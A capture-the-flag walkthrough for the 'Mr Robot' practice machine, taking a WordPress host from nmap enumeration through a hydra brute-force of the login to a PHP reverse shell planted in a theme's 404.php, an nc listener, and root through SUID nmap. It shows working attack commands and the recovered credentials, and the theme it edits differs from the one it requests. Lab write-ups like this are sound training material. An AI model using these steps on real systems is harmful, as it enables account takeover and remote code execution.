# Mr Robot


WORK IN PROGRESS


### Find Own Host

		inet 192.168.30.131  netmask 255.255.255.0  broadcast 192.168.30.255

### Find machine

		nmap 192.168.30.0/24

>Nmap scan report for 192.168.30.130
Host is up (0.00050s latency).
Not shown: 997 filtered ports
PORT    STATE  SERVICE
22/tcp  closed ssh
80/tcp  open   http
443/tcp open   https

### Adding to hosts for convenience

		echo 192.168.30.130 mrrobot >> /etc/hosts

### Enumerate website

		nmap -A --script=http-enum mrrobot

>PORT    STATE  SERVICE VERSION
22/tcp  closed ssh
80/tcp  open   http    Apache httpd
| http-enum: 
|   /admin/: Possible admin folder
|   /admin/index.html: Possible admin folder
|   /wp-login.php: Possible admin folder
|   /robots.txt: Robots file
|   /readme.html: Wordpress version: 2 
|   /feed/: Wordpress version: 4.3.17
|   /wp-includes/images/rss.png: Wordpress version 2.2 found.
|   /wp-includes/js/jquery/suggest.js: Wordpress version 2.5 found.
|   /wp-includes/images/blank.gif: Wordpress version 2.6 found.
|   /wp-includes/js/comment-reply.js: Wordpress version 2.7 found.
|   /wp-login.php: Wordpress login page.
|   /wp-admin/upgrade.php: Wordpress login page.
|   /readme.html: Interesting, a readme.
|   /0/: Potentially interesting folder
|_  /image/: Potentially interesting folder
|_http-server-header: Apache
443/tcp open   ssl/ssl Apache httpd (SSL-only mode)
| http-enum: 
|   /admin/: Possible admin folder
|   /admin/index.html: Possible admin folder
|   /wp-login.php: Possible admin folder
|   /robots.txt: Robots file
|   /readme.html: Wordpress version: 2 
|   /feed/: Wordpress version: 4.3.17
|   /wp-includes/images/rss.png: Wordpress version 2.2 found.
|   /wp-includes/js/jquery/suggest.js: Wordpress version 2.5 found.
|   /wp-includes/images/blank.gif: Wordpress version 2.6 found.
|   /wp-includes/js/comment-reply.js: Wordpress version 2.7 found.
|   /wp-login.php: Wordpress login page.
|   /wp-admin/upgrade.php: Wordpress login page.
|   /readme.html: Interesting, a readme.
|   /0/: Potentially interesting folder
|_  /image/: Potentially interesting folder
|_http-server-header: Apache
MAC Address: 00:0C:29:8B:05:80 (VMware)
Device type: general purpose
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.10 - 4.11
Network Distance: 1 hop


### Robots.txt

		curl mrrobot/robots.txt

>User-agent: *
fsocity.dic
key-1-of-3.txt

### Create desktop folder to store my shit, and download the first key and dic file

		cd ~/Desktop
		mkdir mrrobot
		wget mrrobot/fsocity.dic
		wget mrrobot/key-1-of-3.txt
		cat key-1-of-3.txt

>073403c8a58a1f80d943455fb30724b9

### The dictionary file

See how long the file is

		wc fsocity.dic
		
		or
		
		wc -l fsocity.dic

>858160 fsocity.dic

Holy shit. Remove uniques

		cat fsocity.dic | sort | uniq > filtered.txt
		wc -l filtered.txt

>11451 filtered.txt

Much better.

### WP Login

Browse to:

		mrrobot/wp-login.php

We have a form! Take note of the value naming. 'log' and 'pwd'

View source:

		<form name="loginform" id="loginform" action="http://mrrobot/wp-login.php" method="post">
	<p>
		<label for="user_login">Username<br/>
		<input type="text" name="log" id="user_login" class="input" value="" size="20"/></label>
	</p>
	<p>
		<label for="user_pass">Password<br/>
		<input type="password" name="pwd" id="user_pass" class="input" value="" size="20"/></label>
	</p>
		<p class="forgetmenot"><label for="rememberme"><input name="rememberme" type="checkbox" id="rememberme" value="forever"/> Remember Me</label></p>
	<p class="submit">
		<input type="submit" name="wp-submit" id="wp-submit" class="button button-primary button-large" value="Log In"/>
		<input type="hidden" name="redirect_to" value="http://mrrobot/wp-admin/"/>
		<input type="hidden" name="testcookie" value="1"/>
	</p>
</form>


Try logging in

		user: admin
		pass: admin

>ERROR: Invalid Username

What about mrrobot's show character(s)?(yeah this part is not fully useable irl but hey)

		user: elliot
		pass: elliot

>ERROR: The password you entered for the username elliot is incorrect.

So username is elliot. bruteforce the form with hydra



		hydra mrrobot http-form-post "/wp-login.php:log=^USER^&pwd=^PASS^:Error" -l elliot -P filtered.txt

>[80][http-post-form] host: mrrobot   login: elliot   password: ER28-0652
1 of 1 target successfully completed, 1 valid password found


### Upload Reverse shell script

Check themes, what is currently active?

    Appearance > Themes
    
Edit a 404.php page

    Appearance > editor > (select a non active theme. here I use twentysixteen) > 404 template(404.php)
    
Copy and paste Pentestmonkey PHP Reverse Shell script. (Don't forget to set the local port and ip! Here I use port 7777)
    
    (Modify this stuff)
    $ip = '192.168.30.131'; //CHANGE THIS
    $port = '7777'; //CHANGE THIS




### Set up a listener

		nc -lvp 7777

### Access the page to get reverse shell running (can also just access in browser)

		
		curl mrrobot/wp-content/themes/twentyfourteen/404.php


Find SUID bits

		find / -perm -u=s -type f 2>/dev/null


there's nmap!

		nmap --interactive
		!bash -p
		whoami



why nmap? google for "gtfobins". if you have suid or sudo permissions, that webside will tell you if you can use it to priv esc
